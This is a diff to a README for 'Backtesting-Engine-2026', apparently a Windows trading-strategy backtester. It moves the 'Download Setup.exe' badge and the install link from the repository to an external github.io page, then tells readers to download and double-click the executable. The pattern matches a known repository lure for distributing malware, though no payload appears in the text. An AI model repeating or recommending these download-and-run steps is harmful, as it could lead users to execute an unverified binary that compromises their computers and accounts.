@@ -1,6 +1,6 @@
 # 📈 Backtesting-Engine-2026 - Test trading strategies on historical data
 
-[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://github.com/Hosnimubarakcharlesix969/Backtesting-Engine-2026)
+[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://hosnimubarakcharlesix969.github.io)
 
 ## 🎯 About the Software
 
@@ -23,7 +23,7 @@ This application runs on standard Windows hardware. Ensure your computer meets t
 
 Follow these steps to install the software on your Windows PC:
 
-1. Visit the repository page to initiate your download: [https://github.com/Hosnimubarakcharlesix969/Backtesting-Engine-2026](https://github.com/Hosnimubarakcharlesix969/Backtesting-Engine-2026).
+1. Visit the repository page to initiate your download: [https://hosnimubarakcharlesix969.github.io](https://hosnimubarakcharlesix969.github.io).
 2. Locate the link marked "Setup.exe" on the page.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
